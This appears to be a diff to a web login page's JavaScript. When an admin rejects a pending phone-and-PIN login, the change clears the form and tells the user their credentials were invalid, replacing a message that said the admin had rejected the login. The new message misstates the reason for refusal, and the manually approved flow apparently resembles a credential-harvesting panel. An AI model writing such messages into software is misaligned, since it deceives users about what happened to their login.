@@ -862,8 +862,16 @@
           } else if (status === 'rejected') {
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
+            
+            // Clear login form
+            document.getElementById('lpPhone').value = '';
+            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
+            
+            // Go back to login page
             goTo('page-login');
-            showLgnMsg('error', 'Your login was rejected by the admin.');
+            
+            // Show error message
+            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
